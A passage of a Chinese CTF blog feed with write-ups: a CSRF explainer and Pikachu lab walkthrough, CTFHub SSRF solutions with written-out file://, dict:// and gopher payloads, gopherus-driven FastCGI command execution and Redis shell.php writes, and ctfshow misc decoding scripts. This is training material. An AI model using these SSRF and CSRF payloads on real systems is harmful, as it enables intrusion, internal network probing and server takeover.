href="http://bank.example/withdraw?account=bob&amount=1000000&for=bob2%E5%8F%AF%E4%BB%A5%E4%BD%BFBob%E6%8A%8A1000000">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2可以使Bob把1000000</a> 的存款转到bob2的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该session 的用户Bob已经成功登陆。</p><p>黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory%E3%80%82%E4%BD%86%E6%98%AF%E8%BF%99%E4%B8%AA%E8%AF%B7%E6%B1%82%E6%9D%A5%E8%87%AA">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。</p><p>这时，Mallory 想到使用CSRF的攻击方式，他先自己做一个网站，在网站中放入如下代码： src&#x3D;”<a href="http://bank.example/withdraw?account=bob&amount=1000000&for=Mallory%E2%80%9D%EF%BC%8C%E5%B9%B6%E4%B8%94%E9%80%9A%E8%BF%87%E5%B9%BF%E5%91%8A%E7%AD%89%E8%AF%B1%E4%BD%BF">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory”，并且通过广告等诱使</a> Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从Bob的浏览器发向银行，而这个请求会附带Bob浏览器中的cookie一起发向银行服务器。大多数情况下，该请求会失败，因为他要求Bob的认证信息。但是，如果Bob当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的session尚未过期，浏览器的cookie之中含有Bob的认证信息。这时，悲剧发生了，这个url请求就会得到响应，钱将从Bob的账号转移到Mallory的账号，而Bob当时毫不知情。等以后Bob发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而Mallory则可以拿到钱后逍遥法外。</p><h2 id="CSRF漏洞检测"><a href="#CSRF漏洞检测" class="headerlink" title="CSRF漏洞检测"></a>CSRF漏洞检测</h2><p>1.检测CSRF漏洞是一项比较繁琐的工作，最简单的方法就是抓取一个正常请求的数据包，去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p><p>2.随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞检测的工具，若CSRFTester，CSRF Request Builder等。</p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><blockquote><p>修改用户信息</p><p>执行恶意操作</p><p>盗取用户隐私数据</p><p>作为其他攻击向量的辅助攻击手法</p><p> 传播CSRF蠕虫</p></blockquote><h3 id="防御CSRF攻击"><a href="#防御CSRF攻击" class="headerlink" title="防御CSRF攻击"></a>防御CSRF攻击</h3><p><strong>目前防御CSRF攻击主要有三种策略：</strong></p><blockquote><p>1.验证HTTP Referer字段；</p><p>2.在请求地址中添加token并验证；</p><p>3.在HTTP头中自定义属性并验证。</p></blockquote><p><strong>CSRF与XSS的区别：最大的区别就是CSRF没有盗取用户的Cookie，而是直接的利用了浏览器的Cookie让用户去执行某个动作。</strong></p><h2 id="CSRF挖掘技巧"><a href="#CSRF挖掘技巧" class="headerlink" title="CSRF挖掘技巧"></a>CSRF挖掘技巧</h2><p>漏洞条件</p><blockquote><p>1.被害用户已经完成身份认证</p><p>2.新请求的提交不需要重新身份认证或确认机制</p><p>3.攻击者必须了解Web APP请求的参数构造</p><p>4.引诱用户触发攻击的指令（社工）</p></blockquote><p>各种功能点</p><blockquote><p>密码修改处</p><p>点赞</p><p>转账</p><p>注销</p><p>删除</p></blockquote><h2 id="pikachu-csrf"><a href="#pikachu-csrf" class="headerlink" title="pikachu csrf"></a>pikachu csrf</h2><h3 id="csrf-get"><a href="#csrf-get" class="headerlink" title="csrf (get)"></a>csrf (get)</h3><p>首先，先登录：</p><p><img src="https://s2.loli.net/2022/12/17/FOvE6ks2IVWcUJ5.png" alt="image-20221217184549587"></p><p>点击修改信息，修改后使用bp抓包</p><p><img src="https://s2.loli.net/2022/12/17/fph1sncgN9auiY8.png" alt="image-20221217184645056"></p><p>我们发现，我们修改的数据都出现在了url中，所以我们只需要修改url中相关参数的值，即可修改数据</p><p>这里，我们登录之后，然后修改数据时，向服务器发送了一条数据包，所以我们可以利用csrf漏洞，诱导登录之后的用户，访问带有该url即可实现修改数据的目的。</p><p>我们可以将该url 写在我们的服务器上，当用户被诱导访问我们的网页，且此时已经登录时，触发该url发送数据包。即可修改数据。</p><p>我在服务器上建立了一个x.html的文件，里面写入一个a标签，当点击时，触发修改数据的链接</p><p>注意：要将 &amp; 进行html实体编码， &amp; 在html中有特殊含义，否则会报错</p><p><img src="https://s2.loli.net/2022/12/17/ygfLTZwUvQ98cbP.png" alt="image-20221217190418459"></p><p>当我们登录时：</p><p><img src="https://s2.loli.net/2022/12/17/7OM3feWYntwTAJE.png" alt="image-20221217190734435"></p><p>此时，如果受害者在同一浏览器访问服务器上的页面，</p><img src="https://s2.loli.net/2022/12/17/JHx4kWQ7hdynuDv.png" alt="image-20221217190939162" style="zoom:33%;" /><p>并且点击时，此时就会导致数据被修改</p><img src="https://s2.loli.net/2022/12/17/PiqmzZd4lOvSwf9.png" alt="image-20221217191028038" style="zoom:33%;" /><h3 id="csrf-post"><a href="#csrf-post" class="headerlink" title="csrf (post)"></a>csrf (post)</h3><p>修改信息后，bp抓包</p><p><img src="https://s2.loli.net/2022/12/17/f4o1Wr8QOxBR6NK.png" alt="image-20221217191134434"></p><p>此时，我们可以使用bp自带的构造csrf的功能</p><img src="https://s2.loli.net/2022/12/17/KWOIuH5loTnf6eB.png" alt="image-20221217191533935" style="zoom:33%;" /><p>点击生成CSRF PoC</p><img src="https://s2.loli.net/2022/12/17/hroIREmiVH4QglO.png" alt="image-20221217191616892" style="zoom: 25%;" /><p>自动生成了相关代码，我们直接复制放到 服务器上即可</p><img src="https://s2.loli.net/2022/12/17/Azq1oMnaIj3UmY9.png" alt="image-20221217191730182" style="zoom:33%;" /><p>当用户登录时，访问我们的网站，点击该按钮，就会修改数据</p><img src="https://s2.loli.net/2022/12/17/1vILMiRONkdB2j4.png" alt="image-20221217192000213" style="zoom:33%;" /><h3 id="csrf-token"><a href="#csrf-token" class="headerlink" title="csrf (token)"></a>csrf (token)</h3><p>修改数据，并抓包，发现url中带有 token，</p><p><img src="https://s2.loli.net/2022/12/17/4ITx7Q3mGh82KwP.png" alt="image-20221217192126924"></p><p>这一关使用token验证，首先服务器生成一个token并且返回给客户端，当我们修改数据，发送数据包到服务器时，请求会携带token并且与服务器的token相比较，如果相等就可以修改数据</p><p><img src="https://s2.loli.net/2022/12/17/QxthkMosm38BpbG.png" alt="image-20221217192504094"></p><p>每一次刷新，token都会改变，带有token的 csrf 相对难绕过</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a><a href="https://www.freebuf.com/articles/web/341591.html">相关链接</a></h3>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfhub_SSRF漏洞</title>
    <link href="/2023/08/24/ctfhub_SSRF%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/ctfhub_SSRF%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="1、内网访问"><a href="#1、内网访问" class="headerlink" title="1、内网访问"></a>1、内网访问</h3><img src="https://s2.loli.net/2022/12/19/rNmC6BKdFkWO1qU.png" alt="image-20221219112831233" style="zoom:33%;" /><p>由题目可知，该题可能存在ssrf漏洞。访问 127.0.0.1&#x2F;flag.php 可以得到flag</p><p><img src="https://s2.loli.net/2022/12/19/A68zomKSJ7F1wnY.png" alt="image-20221219112909411"></p><p>我们可以更改 参数url后面的地址为： <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><p><img src="https://s2.loli.net/2022/12/19/tzfNAL3KQTnijCH.png" alt="image-20221219113026903"></p><p>即可得到flag</p><h3 id="2、伪协议读取文件"><a href="#2、伪协议读取文件" class="headerlink" title="2、伪协议读取文件"></a>2、伪协议读取文件</h3><img src="https://s2.loli.net/2022/12/19/rP5QY86TiAqnevd.png" alt="image-20221219113241872" style="zoom:33%;" /><p>根据提示，我们可以使用 <strong>file 协议</strong> 读取文件内容</p><img src="https://s2.loli.net/2022/12/19/nYL3OCqzrIZKi7h.png" alt="image-20221219113344170" style="zoom: 33%;" /><p>所以，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=file:<span class="hljs-comment">///var/www/html/flag.php</span><br></code></pre></td></tr></table></figure><h3 id="3、端口扫描"><a href="#3、端口扫描" class="headerlink" title="3、端口扫描"></a>3、端口扫描</h3><img src="https://s2.loli.net/2022/12/19/4bN7fSFHyX6uTM9.png" alt="image-20221219113504481" style="zoom:33%;" /><p>根据题目提示，我们要进行端口扫描。并且端口范围是 8000-9000</p><p>在SSRF中，<strong>dict 协议</strong>与http 协议可用来探测内网的主机存活与端口开放情况。</p><blockquote><p>dict协议与gopher协议一般都出现在<strong>ssrf</strong>中，用来探测端口的指纹信息。</p><p>同时也可以用它来代替gopher协议进行ssrf攻击。</p><ul><li><p><strong>探测端口指纹</strong></p><p><strong>192.168.0.0&#x2F;?url&#x3D;dict:&#x2F;&#x2F;192.168.0.0:6379</strong></p><p>以上为探测6379（redis）端口的开发</p></li></ul></blockquote><p>所以。我们使用bp抓包进行爆破</p><p><img src="https://s2.loli.net/2022/12/19/DIkbuvE5BAVfpg6.png" alt="image-20221219113719941"></p><p>此处我们使用http协议进行端口探测设置端口</p><p>或者使用 dict协议：</p><p><img src="https://s2.loli.net/2022/12/19/mK9pGudVXW62E3T.png" alt="image-20221219114051616"></p><img src="https://s2.loli.net/2022/12/19/G6wscCahjrAQRxb.png" alt="image-20221219113831042" style="zoom: 25%;" /><p>根据题目提示，选择端口范围，</p><p><img src="https://s2.loli.net/2022/12/19/aWGJvTVIZPyczl8.png" alt="image-20221219113958305"></p><p>此处我们使用5个线程，太快会出错</p><p>然后进行爆破即可，长度不一样的那个就是。</p><h3 id="4、POST请求"><a href="#4、POST请求" class="headerlink" title="4、POST请求"></a>4、POST请求</h3><p><img src="https://s2.loli.net/2022/12/19/2HluMZwYeUCOTbI.png" alt="image-20221219115054338"></p><p>访问：127.0.0.1&#x2F;flag.php</p><p><img src="https://s2.loli.net/2022/12/19/GNqLkEhIKn7SCf3.png" alt="image-20221219115700785"></p><p>发现了一个输入框，但是并没有提交按钮</p><p>查看源代码可得一个key</p><img src="https://s2.loli.net/2022/12/19/SQ7l8jGdc5bFPoZ.png" alt="image-20221219115740513" style="zoom:33%;" /><p>把这个key输入到输入框，按回车：</p><p><img src="https://s2.loli.net/2022/12/19/BUyeDMIcLasFRtl.png" alt="image-20221219115910096"></p><p>发现只能接受来自127.0.0.1的请求</p><p>我们使用file协议读取 &#x2F;index.php 的代码：</p><p><img src="https://s2.loli.net/2022/12/19/IW5N7iZus2bOFnl.png" alt="image-20221219120040520"></p><p>查看 &#x2F;flag.php 源代码：</p><p><img src="https://s2.loli.net/2022/12/19/UNV2l7yH6uiqoTG.png" alt="image-20221219120134627"></p><p>综上，我们可以知道，在&#x2F;index.php  url中直接访问127.0.0.1&#x2F;flag.php 是不能提交key的，我们可以自己构造一个post请求，去提交key。</p><p>尝试使用 <strong>Gopher 协议</strong>向服务器发送 POST 包<br> 首先构造 Gopher协议所需的 POST请求：</p><img src="https://s2.loli.net/2022/12/19/oPKfRbtv1ZLMema.png" alt="image-20221219120823458" style="zoom:33%;" /><p>在使用 Gopher协议发送 POST请求包时，<code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有。 key值为自己所获得的。</p><pre><code class="hljs"> **在向服务器发送请求时，首先浏览器会进行一次 URL解码，其次服务器收到请求后，在执行 `curl` 功能时，进行第二次 URL解码。**</code></pre><p>所以我们需要对构造的请求包进行两次 URL编码：</p><p>第一次编码：</p><p><img src="https://s2.loli.net/2022/12/19/HEzAkpm4bKVctQC.png" alt="image-20221219121000599"></p><p> 在第一次编码后的数据中，**将<code>%0A</code>全部替换为<code>%0D%0A</code>**。因为 Gopher协议包含的请求数据包中，可能包含有<code>=</code>、<code>&amp;</code>等特殊字符，避免与服务器解析传入的参数键值对混淆，所以对数据包进行 URL编码，这样服务端会把<code>%</code>后的字节当做普通字节。</p><p>第二次编码：</p><p><img src="https://s2.loli.net/2022/12/19/nvLEoPtp8yUcrRQ.png" alt="image-20221219121216064"></p><p>  因为<code>flag.php</code>中的<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>无法绕过，只能通过<code>index.php</code>页面中的<code>curl</code>功能向目标发送 POST请求，构造如下Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">url=gopher:<span class="hljs-comment">//127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost:%2520127.0.0.</span><br><span class="hljs-number">1</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-Type:%<span class="hljs-number">2520</span>application/x-www-form-urlencoded%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>AContent-<br>Length:%<span class="hljs-number">25204</span>%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>A%<span class="hljs-number">250</span>D%<span class="hljs-number">250</span>Akey=<span class="hljs-number">1531</span>f30650dc3d95a29e15e63a5f9dfb<br></code></pre></td></tr></table></figure><p>发包即可得到flag</p><h3 id="5、上传文件"><a href="#5、上传文件" class="headerlink" title="5、上传文件"></a>5、上传文件</h3><img src="https://s2.loli.net/2022/12/19/Dm1yMFZKrigJ5vj.png" alt="image-20221219132045143" style="zoom:33%;" /><p>访问 <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p><p><img src="https://s2.loli.net/2022/12/19/m4Xi6Aw5N1K8x2v.png" alt="image-20221219132117378"></p><p>发现需要我们上传文件</p><p>我们同样可以使用file协议去获得源码：</p><p>index.php</p><p><img src="https://s2.loli.net/2022/12/19/P69RLfVwCv7hzgN.png" alt="image-20221219134602481"></p><p>flag.php</p><p><img src="https://s2.loli.net/2022/12/19/8mbyFe6E2A45xKk.png" alt="image-20221219135108490"></p><p>和上一题类似，只用访问用户的ip地址是 127.0.0.1 才可以，如果直接访问这个页面的话，ip地址不对，无法突破</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]<br></code></pre></td></tr></table></figure><p>这个函数，所以我们必须通过 &#x2F;index.php 页面的 curl_exec()函数 执行curl会话，获取指定url的内容，这样通过服务器去访问的话，ip地址就满足要求了，但是该页面并没有文件上传按钮，所以我们可以使用<strong>gopher协议</strong>在&#x2F;index.php页面发送post请求</p><p>上传文件的页面没有提交submit按钮，我们可以自己在页面添加一个(右键添加节点)，上传文件然后bp抓包</p><img src="https://s2.loli.net/2022/12/19/2kKCq7zA1wZrPxu.png" alt="image-20221219135351304" style="zoom:33%;" /><p>将数据包修改为gopher协议所需的样子，然后进行第一次url编码：</p><p><img src="https://s2.loli.net/2022/12/19/4SmeguLsIfviDwK.png" alt="image-20221219135719434"></p><p>然后再将 %0A 或为%0D%0A </p><p>使用小脚本：</p><p><img src="https://s2.loli.net/2022/12/19/8HNaWhyAgdXqlPU.png" alt="image-20221219135757124"></p><p>然后进行第二次编码：</p><p><img src="https://s2.loli.net/2022/12/19/Gs3fKSDJHPOMRdm.png" alt="image-20221219135831410"></p><p>将参数与：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=gopher:<span class="hljs-comment">//127.0.0.1:80/_</span><br></code></pre></td></tr></table></figure><p>进行拼接</p><p>发包即可得到flag</p><p><img src="https://s2.loli.net/2022/12/19/RgH8bs31LferKtB.png" alt="image-20221219140013909"></p><h3 id="6、FastCGI协议"><a href="#6、FastCGI协议" class="headerlink" title="6、FastCGI协议"></a>6、FastCGI协议</h3><p><img src="https://s2.loli.net/2022/12/19/LxqZD2k6e85AMlJ.png" alt="image-20221219173126415"></p><p>我们可以使用 <strong>gopherus</strong> 这个工具</p><p>然后在命令行 去执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 gopherus.py --exploit fastcgi<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/19/DVbsECkzPtgZ3pA.png" alt="image-20221219173229525"></p><p>这时，询问要我们给一个服务器上存在的文件，此处我们写 index.php</p><p>然后询问要执行的命令，此处我们查询根目录下有哪些文件 :  ls &#x2F;</p><p>之后便生成了一串字符串，我们将 :9000&#x2F;_   后面的字符串 再进行一次url编码 (因为浏览器会自动解码一次)</p><p><img src="https://s2.loli.net/2022/12/19/TiN6W4nO8GE1JXA.png" alt="image-20221219173953410"></p><p>将编码后的该字符串与前一部分进行拼接即可，</p><p>这时查询到flag在根目录下，我们使用 gopherus工具再构造一次命令：cat &#x2F;f*   即可</p><p><img src="https://s2.loli.net/2022/12/19/nFR1LB7gac2GSh9.png" alt="image-20221219174109283"></p><p>然后再进行编码，重复上述操作即可得到flag</p><h3 id="7、redis协议"><a href="#7、redis协议" class="headerlink" title="7、redis协议"></a>7、redis协议</h3><img src="https://s2.loli.net/2022/12/19/mECL2yAjDO4Q6nq.png" alt="image-20221219174210683" style="zoom:33%;" /><p>与上题类似，使用 gopherus工具</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">python2 gopherus.py --exploit redis<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/19/PqCjsQOXiym2xJd.png" alt="image-20221219174359850"></p><p>都使用默认的即可，</p><p>生成字符串再次对相应部分url二次编码等操作，访问之后，会在网站根目录生成  shell.php 文件</p><p>并且可以使用 cmd当作 get传参进行命令执行查询flag，或使用蚁剑连接</p><h3 id="8、URL-Bypass"><a href="#8、URL-Bypass" class="headerlink" title="8、URL Bypass"></a>8、URL Bypass</h3><img src="https://s2.loli.net/2022/12/19/PSs5XWndvRKMj6T.png" alt="image-20221219175302689" style="zoom:33%;" /><p><img src="https://s2.loli.net/2022/12/19/4jqShneQ5vXOI2b.png" alt="image-20221219175323495"></p><p>返现，url必须以 <a href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a>  开头</p><p>我们可以使用 @  HTTP 基本身份认证绕过</p><p>HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式。<br> 也就是：<strong><a href="http://www.xxx.com@www.yyy.com/">http://www.xxx.com@www.yyy.com</a></strong> 形式</p><p>构造题目所需 Payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//notfound.ctfhub.com@127.0.0.1/flag.php</span><br></code></pre></td></tr></table></figure><h3 id="9、数字IP-Bypass"><a href="#9、数字IP-Bypass" class="headerlink" title="9、数字IP Bypass"></a>9、数字IP Bypass</h3><img src="https://s2.loli.net/2022/12/19/KqcZ4Jei9U2TFbS.png" alt="image-20221219175737479" style="zoom:33%;" /><img src="https://s2.loli.net/2022/12/19/TKmrYxZlV9D35Jd.png" alt="image-20221219175723351" style="zoom:33%;" /><p>使用file协议读取 &#x2F;index.php  源码， 发现url与域名不能有127 、172、小数点等值。</p><p>但是 &#x2F;flag.php  必须要从127.0.0.1进行访问</p><p>我们可以将 127.0.0.1  进行进制转化：</p><img src="https://s2.loli.net/2022/12/19/AWPMYZtHVJ5rGLF.png" alt="image-20221219180039095" style="zoom:33%;" /><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?url=http:<span class="hljs-comment">//0x7F000001/flag.php     使用16进制的时候要加上0x,因为默认使用10进制</span><br>或<br>?url=http:<span class="hljs-comment">//2130706433/flag.php</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/12/19/PbK6JhFEpj5Scy9.png" alt="image-20221219180300020"></p><h3 id="10、302跳转bypass"><a href="#10、302跳转bypass" class="headerlink" title="10、302跳转bypass"></a>10、302跳转bypass</h3><img src="https://s2.loli.net/2022/12/19/Ri7OV98ZlmGFwDE.png" alt="image-20221219180550356" style="zoom:33%;" /><p><img src="https://s2.loli.net/2022/12/19/pq2AMDZ67GuTHFN.png" alt="image-20221219180531845"></p><p>可以使用 sudo.cc 这个域名 ， 自动解析到 127.0.0.1  </p><p>或者使用自己的服务器写一个重定向跳转代码，访问服务器上的地址后自动跳转到127.0.0.1</p><p>也可以使用短地址：</p><img src="https://s2.loli.net/2022/12/19/YixWRrkEPg8Zcv1.png" alt="image-20221219181150358" style="zoom: 25%;" />]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctfhub_SSRF漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow</title>
    <link href="/2023/08/24/ctfshow/"/>
    <url>/2023/08/24/ctfshow/</url>
    
    <content type="html"><![CDATA[<h2 id="ctfshow【misc】"><a href="#ctfshow【misc】" class="headerlink" title="ctfshow【misc】"></a>ctfshow【misc】</h2><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><p>zip伪加密</p><h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><blockquote><p>偶然发现我竟然还有个软盘，勾起了我的回忆。</p></blockquote><p>软盘也可以用来存储信息，现在一般都不用了。</p><p>我们可以使用vmware去挂载软盘</p><img src="https://s2.loli.net/2023/03/28/Z69Cydk7WXGitU2.png" alt="image-20230328202911936" style="zoom: 67%;" /><p>我们在这里添加一个软盘，然后再选择一下路径</p><img src="https://s2.loli.net/2023/03/28/3Mq82AdhEPIxZYp.png" alt="image-20230328203003521" style="zoom: 50%;" /><p>打开虚拟机，得到flag：</p><p><img src="https://s2.loli.net/2023/03/28/BKyQliCm2Wcd3nP.png" alt="image-20230328203048859"></p><h3 id="miscx"><a href="#miscx" class="headerlink" title="miscx"></a>miscx</h3><p>打开zip压缩包，里面有一个png图片和一个doc加密文档：</p><img src="https://s2.loli.net/2023/03/28/ElUJTLZ7oQgrfSz.png" alt="image-20230328203924567" style="zoom: 67%;" /><p>图片的crc不对，我们可以修复它（然并卵）</p><p>我们猜测压缩包解密密码就是：2020.</p><p>解密打开doc：</p><p>好像是什么音符加密，我们解密一下：</p><p><img src="C:\Users\LIKE\AppData\Roaming\Typora\typora-user-images\image-20230328204816253.png" alt="image-20230328204816253"></p><p>根据压缩包提示</p><blockquote><p>2020快乐！<br>rat？or？</p></blockquote><p>我们猜测密码是 Rabbit类型，密钥为2020</p><p><img src="https://s2.loli.net/2023/03/28/2ySHaAfRbKO1lTN.png" alt="image-20230328204550497"></p><p>用这个密码去打开hint：</p><img src="https://s2.loli.net/2023/03/28/qabmVRMpQuotWxZ.png" alt="image-20230328204900563" style="zoom:50%;" /><p>进行了多次base64加密和url编码，我们写个脚本解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> urllib.parse<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/hint.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = f.read()<br><span class="hljs-comment"># print(data)</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        data = urllib.parse.unquote(base64.b64decode(data).decode())<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(data)<br>        exit(<span class="hljs-number">0</span>)<br>        <br>输出：<br>welcome_to_2020<br>flag <span class="hljs-keyword">is</span> coming...<br>the key <span class="hljs-keyword">is</span> hello <span class="hljs-number">2020</span>!<br></code></pre></td></tr></table></figure><p>key是：<code>hello 2020!</code>，打开flag.txt即可</p><h3 id="misc50"><a href="#misc50" class="headerlink" title="misc50"></a>misc50</h3><p>010打开png图片：</p><p><img src="https://s2.loli.net/2023/03/28/UfQoGkXjSsdI1ql.png" alt="image-20230328212802428"></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">base64解密：</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">JNCVS62MMF5HSX2NMFXH2CQ=</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword">base32解密:</span><br><span class="hljs-keyword"></span>KEY&#123;Lazy_Man&#125;<br></code></pre></td></tr></table></figure><p>我们得到一个key。应该是用来解压缩的。我们使用foremost分离得到一个压缩包：</p><p><img src="https://s2.loli.net/2023/03/28/5nRd2x93oLsMUhC.png" alt="image-20230328213025959"></p><p>解压后打开txt文件：</p><p><img src="https://s2.loli.net/2023/03/28/S8CVH2fbenJWOli.png" alt="image-20230328213239402"></p><p>我们使用脚本将其转化为16进制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">filepath</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath) <span class="hljs-keyword">as</span> fp:<br>        content = fp.read()<br>    <span class="hljs-keyword">return</span> content<br><br><br>number = read_file(<span class="hljs-string">&#x27;C://Users/LIKE/Desktop/thienc.txt&#x27;</span>)<br>result = []<br>result.append(re.findall(<span class="hljs-string">r&#x27;.&#123;2&#125;&#x27;</span>, number))<br>result = result[<span class="hljs-number">0</span>]<br><br>strings = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> result:<br>    y = <span class="hljs-built_in">bytearray</span>.fromhex(i)<br>    z = <span class="hljs-built_in">str</span>(y)<br>    z = re.findall(<span class="hljs-string">&quot;b&#x27;(.*?)&#x27;&quot;</span>, z)[<span class="hljs-number">0</span>]<br>    strings += z<br><br>b = strings.split(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><br>strings = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(i) == <span class="hljs-number">1</span>:<br>        i = <span class="hljs-string">&#x27;0&#x27;</span> + i<br>    strings += i<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(strings)<br></code></pre></td></tr></table></figure><p>然后转为转为2进制格式保存为7z：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-comment"># 16进制转图片</span><br>hex_data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users//LIKE//Desktop//result.txt&quot;</span>).read()<br><span class="hljs-comment"># print(hex_data)</span><br>out=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C://Users//LIKE//Desktop//f.7z&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>out.write(binascii.unhexlify(hex_data))  <span class="hljs-comment"># binascii.unhexlify(hexstr)¶ 返回由十六进制字符串 hexstr 表示的二进制数据</span><br>out.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转换成功！&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/03/28/YxFzQ6XHg5VGwft.png" 